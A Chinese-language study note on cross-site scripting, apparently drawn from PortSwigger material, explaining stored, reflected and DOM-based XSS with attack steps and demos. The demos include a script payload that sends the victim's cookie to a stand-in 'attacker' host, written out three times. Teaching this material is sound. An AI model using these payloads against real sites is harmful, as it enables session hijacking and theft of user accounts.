# https://portswigger.net/web-security/cross-site-scripting

## 定义

跨站点脚本（也称为 XSS）是一种 web 安全漏洞，允许攻击者破坏用户与易受攻击的应用程序之间的交互。它允许攻击者绕过同源策略，该策略旨在将不同的网站彼此隔离。跨站点脚本漏洞通常允许攻击者伪装成受害者用户，执行用户能够执行的任何操作，并访问用户的任何数据。如果受害用户在应用程序中拥有特权访问权限，则攻击者可能能够完全控制应用程序的所有功能和数据

## 存储型

### 注意

恶意代码来自 数据库

### 攻击步骤

攻击者提交了恶意输入，数据库存储了用户输入（含有恶意代码）的数据
前后端都没有过滤/转译用户输入，直接展示到前端页面中
受害者浏览器解析执行了恶意代码

### demo

<script>window.location='http://attacker/?cookie='+document.cookie</script>

被攻击的站点是一个可留言的站点，攻击者在该站点提交了一条评论
受害者访问当前评论页面，浏览器向站点请求对应的页面
服务端应用从数据库中获取对应的评论信息，未经任何转译过滤处理，返回给了浏览器
浏览器解析到攻击者的这条评论时，将其解析为 script 脚本，并执行了这段恶意脚本，将受害者的 cookie 信息发送到攻击者服务器
https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded

## 反射型

恶意代码来自 请求 URL

### 攻击步骤

Hacker 制作恶意的 url, 诱使受害者点击
服务端直接将恶意 url 请求中的相关参数，作为 response body 的一部分, 返回给浏览器
受害者浏览器解析执行了恶意代码

### demo

被攻击的站点是一个带有搜索功能的站点，该站点会讲搜索的内容，作为 query 参数添加到 url 中。攻击者利用该站点，制造了一个如下恶意链接，并通过发送邮件，将链接过在页面上等方式，来诱使受害者点击链接
http://website/search?keywork=<script>window.location='http://attacker/?cookie='+document.cookie</script>
受害者点击了恶意链接，访问攻击站点页面，query 中携带恶意参数，浏览器向站点请求对应的页面
服务端应用直接将恶意 url 请求中的 query（未经任何转译过滤处理），作为 response body 的一部分返回给了浏览器
浏览器解析到搜索关键字时，将其解析为 script 脚本，并执行了这段恶意脚本，将受害者的 cookie 信息发送到攻击者服务器

## Dom based

恶意代码未经过 response body 返回，而是在前端代码逻辑中添加执行

### 攻击步骤

Hacker 制作恶意的 url, 诱使受害者点击
前端代码逻辑中，获取恶意 url 中的相关参数，直接（未经任何转译过滤处理）展示到页面中
受害者浏览器解析执行了恶意代码

### Demo

与上一个例子一样：被攻击的站点是一个带有搜索功能的站点，该站点会讲搜索的内容，作为 query 参数添加到 url 中。攻击者利用该站点，制造了一个如下恶意链接，并通过发送邮件，将链接过在页面上等方式，来诱使受害者点击链接
http://website/search?keywork=<script>window.location='http://attacker/?cookie='+document.cookie</script>
受害者点击了恶意链接，访问攻击站点页面，query 中携带恶意参数，浏览器向站点请求对应的页面
服务端应用返回请求的页面（response body 中并没有携带用户输入）
前端应用逻辑中：获取 URL 中的 query（搜索关键字）参数，将其直接插入到了页面中（未经任何转译过滤处理），浏览器解析执行了这段恶意脚本，将受害者的 cookie 信息发送到攻击者服务器
